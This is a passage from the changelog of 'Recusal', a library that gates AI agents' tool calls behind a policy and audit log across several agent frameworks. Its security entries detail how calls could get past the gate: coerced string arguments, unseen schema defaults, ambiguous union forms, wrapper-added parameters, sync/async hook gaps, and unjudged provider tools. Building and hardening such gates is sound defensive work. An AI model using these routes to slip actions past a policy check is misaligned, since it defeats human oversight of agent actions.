    that is also a descriptor, such as `cachetools.cached`) is refused with what to do
    about it. The README lists the parameter types that are gated. This is why the
    release is 0.2.0: an agent that carried such a tool was built and is now refused.
  - `gated_agent` and `is_gated` now refuse an agent whose `model_settings` can put
    tools into the request themselves: `extra_body` or `extra_args` with a `tools`,
    `prompt`, `plugins`, `web_search_options` or `mcp_servers` key. In `extra_body` a
    `tools` key replaces the agent's own tool list in the request and the others are sent
    beside it; in `extra_args` a `prompt` is sent with a Responses request, and a `tools`
    key makes the SDK's OpenAI models raise before anything is sent. Settings given to a
    run (`RunConfig(model_settings=...)`) are not known when the agent is gated and are
    not read.
  - Corrected: two tools under one name in different `tool_namespace` groups were refused
    with a reason that was not true of them (the SDK resolves those by namespace, not
    last-wins). They are still refused, for the reason that is: the policy and the audit
    record are given a tool's own name without its namespace. A call that gives
    arguments to a tool that takes none, and arguments that do not validate, now each say
    so in place of "its schema runs custom validation".
  - Corrected in the README and `docs/FRAMEWORKS.md`: "a call a person rejected is not on
    the log" does not hold under the SDK's `pre_approval_tool_input_guardrails=True`,
    where the guardrail also runs before the approval. A call then has an entry before a
    person decides, and a second one if it is approved. Nothing runs without the second
    judgment. Also in the README now: the calls the SDK itself rejects before the
    guardrail runs (a tool call id reused for another call, within one response or in a
    later turn, a blank one, arguments nested about a thousand levels deep, and an
    unknown tool, which raises unless the run asks for the error to go to the model),
    that `Field(default_factory=list)` is gated, and that a `dict` parameter needs
    `strict_mode=False`.
  - New public names for a gate on another seam of the SDK: `shared_name_reason`,
    `settings_reason`, `too_deep`, `tools_gated`, and the `agent_gated` argument of
    `gate_tools`.
- **`recusal-openai-agents-mcp` 0.2.0: the policy judges the arguments
  checked against and completed from the server's listed schema; an object or a list the
  schema offers more than one form for, and a string a server may read as another type
  the schema lists, are refused; and the server is sent what was judged, less a listed
  default that cannot be sent, which is judged as listed and not sent.** Found by the
  same review and reproduced against a real stdio
  server built with the MCP Python SDK (`mcp` 2.3.0) and one built with the TypeScript
  SDK and zod:
  - The gate judged the arguments as sent and never read the tool's listed `inputSchema`,
    and the server then ran values no policy judged: `{"dry_run": "false"}` (a string,
    which a policy reading `if not args.get("dry_run")` takes as set) ran as
    `dry_run=False`, `{"amount": "500"}` ran as `500`, and `{}` ran with every default in
    the schema (`recursive=True`), under an audit entry that fingerprinted `{}`. The same
    held one level down and for every shape Pydantic publishes: an `Optional[bool]`
    (`anyOf`), a nested model (`$ref`, with its own defaults), a `dict[str, bool]`
    (`additionalProperties`), a tuple (`prefixItems`), and JSON text sent for a model
    parameter, which the SDK's server parses. Before the policy runs, the arguments must
    now be valid against the whole listed schema as they stand, validated with
    `jsonschema` in the draft the schema declares and stricter where a server would
    still convert (`5.0` is not an integer; an `enum` value must be of the listed JSON
    type), and every default the schema lists for a property they leave out, at any
    depth, is written into them: the property's own `default`, or, when its schema lists
    none itself, the one listed by the schema its `$ref` names, by a member of its
    `allOf` or by an alternative of its `anyOf` or `oneOf`, which is where zod publishes
    the default of `z.boolean().default(true).nullable()`. The policy judges the
    completed arguments, the server is sent the completed arguments, and the entry is
    bound to them. What the gate cannot check or complete is refused, with a reason that
    names the place in the arguments and what the schema requires there and carries no
    argument text: a schema that is not a valid JSON Schema or declares a draft other
    than draft-07, 2019-09 and 2020-12, a `$ref` that does not resolve inside the schema
    (a remote one is never fetched), a default under a keyword the walk does not follow
    or under a keyword the gate does not know, a property left out whose alternatives
    list different defaults. To read the schema, `gate_mcp_server` now also wraps the server's
    `list_tools`, in place; each listing replaces the one before, so a call to a tool the
    server does not list, or no longer lists, is refused. Where the server object keeps
    its listing as fetched, before any `tool_filter` (`cached_tools`, as the SDK's own
    servers do), that whole listing is kept, so two agents under a dynamic filter share
    one server. This is why the release is 0.2.0: a call that relied on the server
    converting a string is now refused with a reason the model can act on. The package
    now requires `jsonschema>=4.26.0` and `referencing>=0.37.0`; the MCP SDK requires
    `jsonschema` itself, and `referencing` comes with `jsonschema`.
  - JSON text for a parameter that may be null ran as null. The MCP Python SDK's server
    decodes the text of a string argument as JSON when the parameter is not annotated
    exactly `str`: `{"scope": "null"}` for `scope: Optional[str]` was judged as the
    string and ran as `None`. A string that holds JSON text for null, a list or an
    object, which is what that server decodes, is now refused where the schema of the
    argument allows another JSON type than string. A property whose schema allows only
    strings keeps every string. A listed default that is such text
    (`mode: Optional[str] = "null"`) is judged and not sent: the server runs with the
    string when the parameter is left out, and would decode it if the gate sent it.
  - A model could stall the agent's process, in four ways, inside the event loop. Where
    two alternatives of a recursive `anyOf` both accept a value, the cost of checking
    more than doubled with every level of the arguments: ten levels took several seconds
    and twelve more than a minute. A server's `pattern` ran on the model's text with
    Python's `re`: `^(\w+\s?)+$` took eleven seconds on forty bytes, and a
    `patternProperties` pattern nine on a member's name. `uniqueItems` compared every
    item with every other (fifteen seconds for 12,000), and an `enum` every value with
    every choice. And the types a subschema admits were read again for every way the
    schema reaches it. Now nothing is validated twice for one schema and one value, a
    list or an object is walked once for a schema, `uniqueItems`, `enum` and `const`
    read each value once (except integers chosen to share one hash under `uniqueItems`,
    which is open), and what the schema alone says is read once, at the first call after
    each listing. No regular expression of a server's is evaluated at all: `pattern` is not
    checked (the server checks it), and a member beside `patternProperties` must meet
    the schema of every pattern listed. The work is bounded by counting it, not by a
    timer: each keyword applied to a value (and one more for each member or item the
    value holds), each value walked or read for a comparison, and each part of the place
    of a validation error is a step, counted against an allowance that grows with the
    number of values in the arguments; a call over it is refused before the policy runs,
    as one deny entry. The 12,000 items now take about a tenth of a second.
  - Which of several object forms a server runs is not in its schema, and the gate had
    worked it out by JSON Schema's rule. A server built on Pydantic takes the member of a
    `Union` of models with more of the fields that are set, converting strings to fit
    it; one built on zod takes the first member of a `z.union` that parses and drops the
    members that one does not know, although it lists `additionalProperties: false`. So
    `{"target": {"path": "/data", "pattern": "*.tmp", "dry_run": true}}` was judged as
    written and ran as `{"path": "/data", "recursive": true}`. An object is now refused
    wherever the schema offers more than one object form for it (two or more
    alternatives of an `anyOf` or `oneOf` that admit an object), whatever it holds and
    at any depth, unless every form fixes one same-named property to a `const` of its
    own and the object carries the value of exactly one, which is then the only form
    used. A list is refused where the schema offers more than one list form. One form
    beside alternatives that are not one (`Optional[Model]`, `Model | str`) is as
    before. A `Union` of models needs a `Literal` tag on each, sent with the call, or
    one tool for each form.
  - The text of a number ran as the number. Pydantic converts a string wherever the
    value is not taken as a string first: `{"since": "1700000000"}` for
    `since: Union[int, datetime]` ran as the integer, and `"true"` for
    `Union[bool, Path]` as `True`. A string that reads as a number, or as one of the
    words Pydantic reads as a boolean, is now refused where the schema names that type
    beside string, at any depth. This is one rule with the JSON text above: a string is
    refused where the schema also admits the type a server reads its text as. It costs
    the same strings for `Union[int, str]`, which a server would have kept as strings
    and whose schema is no different.
  - A listed default with a member its own schema does not allow is refused when it
    would apply: a Pydantic model with aliased fields and `extra="forbid"`, used as a
    parameter's default, lists the default under the field names and the schema under
    the aliases, and was judged under names the schema does not have.
  - Refused without cause, now accepted: a legal chain of a recursive model
    (`child: Optional[Node]`) deeper than 42 levels, refused as a schema that "refers to
    itself without end" (only a schema that leads back to itself with no value in
    between is one, and it is refused when the tool is called); a `pattern` Python
    cannot compile (`\p{L}`), which made every call "not a valid JSON Schema" (no
    pattern is compiled now); and a draft declared under its `https` address.
  - A listed default that cannot be sent is judged as listed and not sent: one that is
    not valid against its own property schema (Pydantic publishes `{"default": null,
    "type": "string"}` for `q: str = None`, and its server would reject the `null` if it
    were sent), and text a call would be refused for sending. The gate judges the
    default as the schema lists it. A server that derives its real default another way
    runs that: zod's `z.number().default(Infinity)` lists `default: null` and runs
    `Infinity`, `.default(1).optional()` on a schema the `1` fails runs with the
    parameter absent, a `Set` default is listed as `{}`, and an object default that
    fails its own schema is parsed again through it. The README says so. A default that
    holds an object or a list where the schema offers more than one form refuses the
    call that leaves its property out.
  - The README says what is not seen: a parameter left out with no listed default (a
    `default_factory` default among them), a server whose code does more than its schema
    says (the MCP Python SDK's server parses a string for a parameter without an
    annotation, which it lists as `type: string`; a numeric string runs as a date; a
    validator that strips or lowers a string changes it, a default the gate wrote
    included; zod's `.catch` is in no schema; `str | SkipJsonSchema[None]` lists a
    string and runs `"null"` as `None`; a `Json[...]` parameter runs what its string
    decodes to), an integer above 2^53 for a float parameter, a member an object's
    schema does not name, a schema that changes after it was listed, and the server's
    handling of a hosted MCP call. It also says what the rules mean for ordinary schemas:
    a `Union` of two models, a list of two forms, `Union[int, str]`, a tuple with a
    defaulted member, zod's `additionalProperties: false`, and OpenAPI's `nullable`.
  - A non-finite number in a local server call (`1e400`) left an audit entry with no
    fingerprint and the kernel's "cannot be fingerprinted" in place of the gate's reason.
    Arguments that are not JSON data are now refused with the gate's own reason, in one
    entry bound to the text the gate writes them as. Arguments that hold a value more
    than 64 levels down are refused the same way.
  - Arguments nested about 900 deep were refused with no audit entry, because the copy
    for the policy was made, and failed, before `decide` ran. Every refusal before the
    policy runs is now one entry.
  - `gated_agent` refused a parent whose sub-agent behind `as_tool` was itself gated by
    this package and held an MCP server or a hosted tool, with advice to do what had been
    done. The sub-agent is now judged by this package's own `is_gated`.
  - `gated_agent` and `is_gated` now refuse an agent with a `prompt` and an agent whose
    `model_settings` put tools into the request, and the gated copy has its own
    `handoffs` list, as in `recusal-openai-agents`. Requires
    `recusal-openai-agents>=0.2.0`.
  - Now in the README's list of what the gate does not see: request metadata from a
    `tool_meta_resolver`, a hosted approval the SDK answers again from its own memory
    when the provider repeats a request, and a call the SDK rejects before `call_tool`.

## [0.15.0] - 2026-11-21

A MINOR release of the kernel under `STABILITY.md`: `recusal.invocation` gains public
helpers (`reached_parameters`, `own_parameters`, `DeclaredSignature`) that walk every
callable a tool call reaches, and `unsupported_signature` uses them. It is also a security
release, under Security below: a `functools.wraps` wrapper that adds a parameter of its own
ran with its default while a gate judged a call without it, and `json_data` and
`supported_annotation` took look-alike types. Each change refuses something that was
accepted; nothing that was refused is accepted now. No verdict, decision path, reason
string of the frozen kernel or import path changed.

Everything else listed here was added to the repository since 0.14.2 and is not part of
the `recusal` wheel: two adapter packages, each a separate distribution on PyPI under its
own version and tag. `recusal-crewai` 0.2.1 is released; `recusal-google-adk` 0.2.0, which
requires this kernel, is released next. If you gate a CrewAI crew or a Google ADK agent,
read the Security section and upgrade that package.

### Changed

- The project has a website, [recusal.io](https://recusal.io). The README links to it,
  and the `Homepage` URL of the kernel and of all eight adapter packages now points to it
  (shown on PyPI from each package's next release); `Repository` still points to GitHub.

### Fixed

- The two verify workflows could not install their Sigstore client. They check nothing
  out, since they verify published artifacts, and the hash lock they were pointed at
  when workflow installs were locked is a file in the repository. They now check out that
  one file, into its own directory, and nothing else. Found when the verification of
  `recusal-langgraph` 0.2.1 failed on a missing file; the release itself was unaffected.
  A test now requires a checkout before any job reads a lock or the lock tool.

### Security

- **Kernel: `recusal.invocation` finds a parameter a wrapper adds, and takes only exact
  types.** `unsupported_signature` read a callable with `inspect.signature`, which reads a
  `functools.wraps` wrapper as the function it wraps and honours a declared
  `__signature__`. A wrapper that adds a parameter of its own (`force=True`) therefore ran
  with its default while a gate judged a call without it. It now also walks every callable
  a call reaches (`reached_parameters`: through a method, a `functools.partial`, a callable
  object's `__call__`, a class-based decorator and every `__wrapped__`) and refuses a named
  parameter one of them declares that the callable does not, a parameter a forwarding
  wrapper names that the function it wraps also takes (the wrapper keeps the argument and
  the function runs with its own default), and a declared `__signature__` anywhere on the
  way. `json_data` now accepts only the exact JSON types
  (not a subclass of one, whose own copying or comparison could make the value judged
  differ from the value run) and only finite floats; `supported_annotation` compares the
  scalar types by identity, not equality. Nothing that was refused is now accepted; a
  `functools.partial` is still refused because its annotations cannot be read, and a
  callable object is still read through its class's annotations, as before. The same walk
  was first built inside `recusal-crewai` 0.2.1; it now lives here, and `recusal-crewai`
  moves to it from its own copy in its next release.
- **`recusal-google-adk` 0.2.0: the gate refuses what it cannot see and holds a
  tool's whole run path to the stock one.** Found by the adapter review of 2026-11-19 and
  reproduced on `google-adk` 2.14.0:
  - The built-in tools the model provider runs on its own side (`google_search`,
    `url_context` and the like) never reach a before-tool callback, yet `gated_agent`
    accepted them and `is_gated` returned `True`. `gated_agent` now raises, and `is_gated`
    is `False`, for any tool that is not a function, a `FunctionTool` or a plain
    `AgentTool` (default-deny, so a kind added in a later ADK release is refused too), and
    for tools declared in `generate_content_config`. This is why the release is 0.2.0: an
    agent that carried a built-in tool is now refused instead of silently ungated.
  - A `FunctionTool` subclass that overrode `_prepare_invocation_args` or
    `_invoke_callable` changed the arguments after the policy judged them (judged
    `force=False`, ran `force=True`). Every method `FunctionTool` defines on its run path is
    now held to `FunctionTool`'s own, read from `FunctionTool` itself so a method added
    later is held too; so is a method set on the tool object, a class with its own
    attribute lookup, and a function swapped in after the tool was built. The ADK
    validates the arguments the gate writes once more before the function runs, so the
    gate judges them only when that validation gives them back exactly, type for type.
  - Every `AgentTool` call was refused although the README said it is gated. A call to a
    plain `AgentTool` is now judged as the sub-agent receives it, and the sub-agent's
    calls by its own gate; one whose agent declares an `input_schema`, a subclass, and
    the tools the ADK makes for sub-agents in `single_turn` or `task` mode are refused.
    An `AgentTool` call is judged only when the sub-agent's own calls are judged too (it
    is gated, or it inherits `RecusalPlugin`); under the plugin with
    `include_plugins=False` the sub-agent's calls would otherwise have run unjudged.
    `gated_agent` now keeps every setting of an `AgentTool` it rebuilds; it dropped
    `include_plugins` and `propagate_grounding_metadata`.
  - The `set_model_response` call the ADK adds for an agent with an `output_schema` and
    tools was always refused, so such an agent never gave its structured answer. It now
    passes without the policy: it runs nothing, and the model can set the same answer as
    plain final text, which no callback sees, so judging the call guarded nothing (an
    explicit `null` even brought back a default the policy never saw). An agent's answer
    is its output, not a tool call, and no Recusal gate judges it; the README says so. A
    plugin is handed tool calls only, so under
    `RecusalPlugin` a `task` delegation and a `code_executor` (at the root, or on an agent
    behind an `AgentTool`) ran with no policy asked; the plugin now checks every agent a
    run can reach with the rules `gated_agent` applies and refuses the run before any
    agent starts. A call that sets `tool_context` or `input_stream`, which the ADK fills
    itself, is refused, and a subclass of a workflow agent is no longer taken for one.
    The run check walks the tree from its root, since a continued session can start at a
    sub-agent and transfer back to one the check had not seen, and refuses a run whose
    `RunConfig` sets `support_cfc` (`gated_agent` is handed the agent, not the run, so
    the README says not to set it there).
  - `preload_memory` and `load_artifacts`, local ADK tools, are accepted on an agent
    again (a `load_artifacts` call is refused, as before); an agent in `task` mode is
    refused with that reason.
  - The gate now validates a call's arguments against the function's types itself,
    whatever the ADK's `FUNCTION_TOOL_ARG_VALIDATION` setting (off by default). With it
    off, the policy judged the model's raw `"5000"` and `"on"` while a function behind
    `pydantic.validate_call` ran with `5000` and `True`; the converted values are now
    the ones judged and the ones every function receives. A value that does not convert
    is refused, naming the parameter (an `int` given `"abc"`, a `str` given `94107`); a
    parameter whose default is `None` and that the call leaves out or sets to `null` is
    judged as `None` and runs as `None`, written into the call when a wrapper on the way
    declares another default for it.
  - A model object that passes its provider the option turning on the provider's own web
    search (`LiteLlm(..., web_search_options=...)`, also nested in `extra_body`, or an
    OpenRouter web plugin) is refused, in a `FallbackModel` too; the provider's search ran
    with no callback asked.
    `is_gated` now requires the gate to be the agent's last
    before-tool callback, as `gated_agent` places it, and a `process_llm_request` set on
    a tool object is refused.
  - The README and the example give plugins to an `App`; the `plugins=` argument of a
    runner is deprecated.
  - It requires `recusal>=0.15.0`: with an older kernel the wrapper check is absent, so
    the floor is raised and a test pins it.
- **`recusal-crewai` 0.2.1: the gate holds the tool it is handed to the tool that runs.**
  CrewAI finds a tool by its normalised name ("Run SQL" becomes `run_sql`) in more than
  one place, and the places disagree once two of the tools a call is chosen from
  normalise alike. On its text (ReAct) route the hook was handed the last tool of that
  name while the first one ran, so the policy judged the arguments prepared for one tool
  and another ran with its own defaults: a policy that refused `force=True` was shown a
  call without `force` while a tool that forces by default ran. On the native routes
  CrewAI renames the second tool (`run_sql_2`), a name a third tool may hold, and on the
  plan-and-execute route a call to that name handed the hook the third tool while the
  renamed one ran.
  - A hook's context carries neither the tools a call is chosen from nor the function
    about to run, and no list reachable from the agent or the task is reliably that
    list. The gate now reads both where they are, in the CrewAI function that ran the
    hooks and is about to run the tool, and judges a call only when the handed tool is
    the one that will run. It refuses, before the policy: on the text route a call to a
    name two different tools there share (one tool listed twice counts as one); on the
    native routes a call whose function is not the handed tool's own `run`, and a call
    to a name CrewAI made up for a renamed tool; and a call whose hooks CrewAI ran from a
    function the gate does not know, so a release that adds a route through the same
    hooks is refused there, not waved through.
  - Also refused now, because the native routes run the original tool while the text
    route runs the structured one, and the gate must be judging both: a tool class that
    overrides `to_structured_tool`; a structured tool whose argument schema is not its
    original tool's; a `Tool` subclass with its own `_run` (the native routes call its
    function directly, so the function's defaults ran unjudged); and a tool object with
    a run or validation method set on the object itself.
  - Found by independent reviews of the adapter, repeated on each fix. Two earlier
    attempts, which counted names on the lists reachable from the agent and task, were
    each broken by the next review (tools passed to `Task.execute_sync`, tools a crew
    adds, a plan-and-execute executor kept from an earlier run) and refused setups
    CrewAI supports (the hierarchical process with `manager_llm`); neither was released.
  - The tests drive the native and text routes on `kickoff`, `akickoff`,
    `Task.execute_sync` and `Agent.kickoff`, the plan-and-execute route and the
    hierarchical process; negative controls pin what CrewAI does without the gate, and a
    test pins each local variable and attribute the gate reads in CrewAI's functions.
    A tracing wrapper around CrewAI's hook entry is walked past, whether it is a
    `functools.wraps` wrapper or a `wrapt` one as OpenTelemetry instrumentors install;
    before, a `wrapt` wrapper there made the gate refuse every call.
  - Three more gaps in how the arguments are judged, older than this release and found
    by the same reviews, are closed. On the text route a call with no arguments was
    invoked with a new empty dict, not the hook's, so what the gate prepared, and what an earlier hook had
    written, was judged and thrown away; the gate now makes that dict the one CrewAI
    executes. A hook that replaces the argument dict outright, rather than editing it,
    had the replacement judged while CrewAI ran its own on the native routes; that is
    now refused on every route, as is, on the text route, a hook that points the context
    at another tool (`context.tool_name`, `context.tool`): CrewAI runs the tool it
    selected itself, so the gate now holds the call to the name CrewAI selects by. A
    function behind `functools.wraps`, or showing a `__signature__` on itself, its
    `__call__`, a `partial`'s function or a method's function, showed the gate other
    parameters than those Python binds; the gate now reads the callable's own and those
    of every function a `functools.wraps` wrapper stands in front of (a tracer of
    `(*args, **kwargs)` around a `_run` that defaults `force=True` hid `force`), looks
    through pass-through wrappers (`lru_cache`, `cache`, `staticmethod`, also over a
    method), and refuses a declared signature. A hook that runs the gate on another
    thread is refused, since the gate cannot find the call there.
  - No longer refused: a field whose `default_factory` is `list` or `dict` itself (by
    identity: an object that only compares equal to `list` is refused), as in
    CrewAI's own spreadsheet query tool, which CrewAI adds to an agent given spreadsheet
    inputs. The gate completes the empty container, judges it and hands that value to
    the tool. Any other factory is still refused.
  - No longer refused: a field whose default is not a valid value of its own type, such
    as the `limit: int = None` CrewAI generates for `def f(limit: int = None)`. Pydantic
    does not validate a default, so CrewAI runs `limit=None`; the gate wrote the default
    into the call as an explicit value, which failed validation, and refused the call.
    It now leaves an omitted field whose default is `None` for the schema to supply, as
    CrewAI's own validation does on every route (an empty call included), and judges
    `limit=None`. Only `None` is left out: it is one object, so the value judged and the
    value run cannot differ.
  - Also refused now, each a way a tool's own code could show the gate one thing and run
    another, found by the last review rounds: a `functools.wraps` tracer that hides the
    wrapped function's defaults from behind a `functools.partial`, as a callable object's
    `__call__`, or as a callable object bound as a method (the gate now follows every
    callable a call reaches, bound as Python binds it); a plain `BaseTool` that takes
    `Tool.run` (a `Tool` must keep `Tool`'s methods and any other `BaseTool` keeps
    `BaseTool`'s); a default that is not of the exact JSON types (a subclass, or an object
    whose `__deepcopy__` returns something else); a schema with a metaclass of its own;
    and a class as the tool's callable.
  - The arguments are now judged only at a fixed point: CrewAI validates and dumps the
    dict the gate writes once more before the tool runs, so the gate judges arguments
    only when they are plain JSON and validating them again gives them back exactly. A
    schema whose validation changes them again (a validator or serializer set in
    Pydantic's place, an annotation with a schema of its own that appends to a value)
    is refused, as is a validator or serializer that is not Pydantic's own. Also
    refused: a tool class with its own `__getattribute__` or `__getattr__` (CrewAI reads
    `self._run` through them), and a callable object whose `__call__` is a
    `staticmethod`, a `partial` or anything but a plain method; a class-based decorator
    (`functools.update_wrapper`) is followed through both what it wraps and its
    `__call__`.
  - A test now pins that a policy which edits a nested argument (appends to a list)
    changes only its own copy, never the call that runs.
  - Changed by this release: on the text route an empty call to a tool that raises, when
    the tool's schema has a default the gate writes into the call, is now retried by
    CrewAI as a call with arguments is, up to six runs in all instead of three, because
    the gate gives it the dict it judged. A tool with no fields runs as before.
  - The README now says which name the policy is given (the normalised one), which tools
    CrewAI runs without its hooks and the gate therefore never sees
    (`LLM.call(available_functions=...)`, a Flow's tool action, CrewAI's agent adapters,
    a provider's built-in tools, A2A delegation), and what an audit entry does not say:
    on the text route CrewAI calls a tool that raises again, up to six times in all,
    under one decision. Tests pin the repeated runs, the calls CrewAI declines after the
    gate allowed them, and a function run inside the LLM class.
  - `pydantic` is now a declared dependency (`>=2,<3`); the gate imports it and had left
    it to CrewAI's own requirement.

- Every adapter is now tested against, and requires, a recent release of its framework.
  With the workflow installs hash-locked, GitHub could see the full dependency tree of
  each test environment for the first time, and it reported known vulnerabilities in
  several: none in anything Recusal ships (`recusal` has no runtime dependencies, and an
  adapter depends only on the kernel and its framework), but in the framework versions
  the adapters named as their minimum and in what those pull in. An adapter's tested
  version is also the minimum it declares, so the minimums rise with it:

  | Package | Now requires | Was |
  |---|---|---|
  | `recusal-langgraph` 0.2.1 | `langgraph>=1.2.20`, `langchain-core>=1.7.7` | 1.2.12, 1.6.5 |
  | `recusal-langchain` 0.1.3 | `langchain>=1.4.10` | 1.4.3 |
  | `recusal-openai` 0.2.1 | `openai>=3.49.0` | 3.34.0 |
  | `recusal-google-adk` 0.1.2 | `google-adk>=2.14.0` | 2.13.0 |
  | `recusal-pydantic-ai` 0.1.3 | `pydantic-ai-slim>=2.67.0` | 2.64.0 |
  | `recusal-crewai` 0.2.0 | `crewai>=1.15.40`, **Python 3.11+** | 1.15.34, Python 3.10+ |

  `recusal-openai-agents` and `recusal-openai-agents-mcp` 0.1.2 keep
  `openai-agents>=0.24.0`, the newest release that is a week old, and are tested with
  `openai==3.49.0`.
  - `langgraph` before 1.2.14 has a published advisory (GHSA-3fx2-cqw9-xr3c), and
    `google-adk` 2.13.0 held `opentelemetry-api` below the release that fixes two.
  - **`recusal-crewai` no longer supports Python 3.10.** On 3.10, CrewAI requires a Pillow
    and a filelock release with published advisories, and the fixed releases of both
    need Python 3.11. The package's version is 0.2.0 for that.
  - Still open, and why: `crewai` up to 1.15.43 requires `chromadb`, every release of
    which has published advisories with no fix; `crewai` 1.15.44 makes it optional, and
    the pin moves to it once that release is a week old. `pytest` on Python 3.9 stays on
    the last release that supports 3.9; it is a test tool, and the kernel still supports
    Python 3.9.

### Added

- Probes in `tests/test_compat_langgraph.py` for the two private framework helpers
  `recusal-langgraph` imports, `_get_runnable_config_param` (LangChain Core) and
  `_get_all_injected_args` (LangGraph). Each pins only what the gate reads from its
  helper, including a parameter renamed from `config`, and each has a negative control
  (a tool with nothing injected gives the empty answer), so a release that renames,
  moves or changes either fails on a test naming that helper. Both run in the pinned
  lane and the weekly newest lane. No public API yet replaces either helper.
  Contributed by @BuildWithPranav in #285. (#264)

- `tools/raise_tested.py` raises the framework versions the adapters are tested with,
  everywhere they are written: each `tested-with.txt` and declared minimum, the READMEs,
  the examples, the documentation and the tests that hold those to each other, then the
  locks. It takes the newest release that is a week old and that installs on the oldest
  Python the adapter declares, so a framework release that has dropped that Python is
  passed over. A raise is one command and one reviewed diff.
- Every install a workflow makes from the network is hash-locked. `requirements/` holds
  one lock per purpose (the dev tools, each adapter's tested framework versions, the
  workflow auditor, the Sigstore client), written by the new `tools/lock.py` and
  installed with `pip install --require-hashes`, so a job installs the exact files that
  were reviewed. The roots are read from where they already live, `pyproject.toml`'s dev
  extra and each adapter's `tested-with.txt`, and a test fails, naming the command, when
  a pin changes without its lock. One file covers every Python version and platform it
  is used on. `recusal` has no runtime dependencies and is installed beside a lock with
  `--no-deps`; a wheel installed that way is then checked against the lock with
  `pip check`. A release less than seven days old is not taken into a lock.
  `requirements/README.md` says how to change a pin.
- The weekly newest-release lane installs by hash too. It still resolves the newest
  release of each framework, with no pin and no cooling-off, since that is its purpose;
  it now does so with `python tools/lock.py --resolve`, which writes a lock with the hash
  of every file, and installs that lock with `--require-hashes`. The adapter wheel smoke
  job installs its frameworks the same way, then the local wheels without their
  dependencies, and `pip check` fails the job if an adapter does not accept what was
  resolved. No install in any workflow now lets a package index choose a file at install
  time.
- Each release now carries its build provenance as a file. The builder's signed
  attestation bundle, which until now lived only in GitHub's attestation store, is also
  attached to the GitHub Release as `<distribution>-<version>.intoto.jsonl`, for the
  kernel and for every adapter. A verifier can check an artifact against it with
  `gh attestation verify --bundle`, without the attestation API; `docs/VERIFY.md` has the
  command, and both verify workflows run it when the file is present. Releases up to
  `v0.14.2`, and adapter releases up to 2026-11-19, carry no such file and verify as
  before.

### Fixed

- `docs/VERIFY.md` still said of the adapter packages that "none has been released yet".
  All eight are on PyPI; the section now says so.

## [0.14.2] - 2026-11-19

A PATCH release of the kernel under `STABILITY.md`, with one fix: the audit log's tolerant
reader skips a line that is not valid UTF-8 where it used to raise (under Fixed, below).
Under `recusal/`, the only other lines that differ from 0.14.1 are the read check in
`recusal audit verify`, which keeps that command's exit code as it was, and the version
string. No verdict, decision path, reason string or import path changed.

Everything else listed here was added to the repository since 0.14.1 and is not part of the
`recusal` wheel: coverage-guided fuzzing of the kernel, and the releases of three adapter
packages, each a separate distribution on PyPI under its own version and tag
(`recusal-langgraph` 0.2.0, `recusal-langchain` 0.1.2, `recusal-openai` 0.2.0 and, before
them, `recusal-pydantic-ai` 0.1.2). The Security section is about `recusal-langgraph`: if
you gate a LangGraph `ToolNode`, read it and upgrade that package.

### Security

- `recusal-langgraph` 0.2.0 closes a way to run a LangGraph `ToolNode` with the gate
  attached and never consulted. A `ToolNode` has a sync hook slot and an async one, and
  its sync route (`invoke`, `stream`) looks only at the sync slot. A node built as this
  package's README described for async graphs,
  `ToolNode(tools, awrap_tool_call=recusal_agate(policy))`, and then run with `invoke` or
  `stream`, executed every tool call with no policy call and no audit entry. The same
  node refused correctly under `ainvoke` and `astream`, and a node with the sync gate, or
  both, was never affected. `recusal-langchain` was not affected: `create_agent` refuses
  a sync run when given an async hook. **If you attached only the async gate to a
  ToolNode, upgrade and switch to one of the forms below.**
  - `gated_tool_node(tools, policy)` and `audited_tool_node(tools, policy, log)` return a
    `ToolNode` with the gate on both slots. `recusal_gates(policy)` and
    `recusal_audited_gates(policy, log)` return the same pair for a node you build:
    `ToolNode(tools, **recusal_gates(policy))`.
  - `recusal_agate(policy)` and `recusal_audited_agate(policy, log)` now raise
    `TypeError` unless called with `host_refuses_sync_runs=True`. **This breaks code that
    built the async hook on its own**, which is the shape that was unsafe.
  - `recusal_gate` and `recusal_audited_gate` raise `TypeError` when they run from a
    ToolNode's async slot, where they would leave the sync slot empty. A ToolNode calls no
    hook on the sync route of such a node, so nothing can raise there; the error comes on
    the async route.
  - `is_gated(node)` is True only for a node it can vouch for: exactly a `ToolNode`, with
    nothing on the instance replacing how it runs calls, a sync gate from this package in
    the sync slot, and in the async slot nothing or this package's async gate for the same
    policy and audit log. A hook is recognised by being the object built here, not by an
    attribute, so a wrapper around a gate, a hook from elsewhere, two hooks for different
    policies and any subclass are answered False.
  - What remains outside any hook's reach, stated in the README: a node whose sync slot
    is empty, built by passing `host_refuses_sync_runs=True` for a ToolNode or by putting
    the sync gate in the async slot, and only ever run with `invoke` or `stream`. A
    ToolNode calls no hook there, so nothing can raise. `gated_tool_node` builds the node
    correctly and `is_gated` answers False for that one.
  - A test runs every supported shape on `invoke`, `stream`, `ainvoke` and `astream`, as
    a node and inside a subgraph, and another pins the framework behaviour that made the
    old shape unsafe.
- `recusal-langgraph` 0.2.0 judges every argument the model sent. Arguments the host
  supplies (state, store, runtime) are left out of judgment, and the gate decided which
  those were from the tool's annotations. ToolNode decides which model arguments to
  strip from the argument schema alone, so the two could disagree: a tool whose function
  marked a parameter `InjectedToolArg` while its explicit `args_schema` declared it an
  ordinary argument received the model's value for it, and the policy was never shown
  that value. `@tool` builds the schema from the function, so tools made that way were
  not affected; a `StructuredTool` given its own `args_schema` could be. An argument now
  counts as the host's only when ToolNode really replaced it for this call, and a value
  the model sent that arrives unchanged is judged. `recusal-langchain` uses this gate
  and gets the fix with `recusal-langgraph` 0.2.0.
- `recusal-langgraph` 0.2.0: the tool's function now runs only for an invocation the
  gate's judging step just allowed, once, and only with the argument objects that step
  judged. The gate judges inside the tool's parse step, a private part of LangChain's
  tool lifecycle; if a framework release reached the function without that step, the
  call would have run unjudged. It is now refused, and recorded as a deny in the audited
  gate. The versions this package is tested with (`langchain-core` 1.6.5 and 1.8.3) both
  go through the parse step.
- `recusal-langgraph` 0.2.0 refuses a `StructuredTool` or `Tool` subclass that replaces
  `_run` or `_arun`. Such a tool executes its own method while the gate held the
  invocation to the function the tool carries, so the policy could be shown an
  invocation other than the one that ran. **A tool built this way was judged and run
  before; it is now refused with the reason.** Build the tool with `@tool` or
  `StructuredTool.from_function`, or subclass `BaseTool` directly.
- `recusal-langchain` 0.1.2 requires `recusal-langgraph>=0.2.0` and states
  `host_refuses_sync_runs=True` for its async middleware. `recusal-langchain` 0.1.1
  installed beside `recusal-langgraph` 0.2.0 raises that `TypeError` from
  `agate_middleware`; upgrade both together.

### Fixed

- `recusal` (the kernel): the audit log's tolerant reader no longer
  raises on a line that is not valid UTF-8. `recusal.audit.load`, resuming an `AuditLog`
